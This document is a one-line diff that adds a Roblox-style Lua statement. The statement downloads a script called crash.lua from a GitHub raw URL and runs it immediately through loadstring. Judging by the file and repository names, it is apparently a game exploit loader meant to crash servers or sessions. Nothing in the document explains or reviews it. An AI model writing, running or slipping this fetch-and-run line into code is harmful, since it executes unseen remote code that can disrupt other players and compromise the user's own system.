@@ -1,0 +1,1 @@
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/remlx/popitrading/main/crash.lua"))()
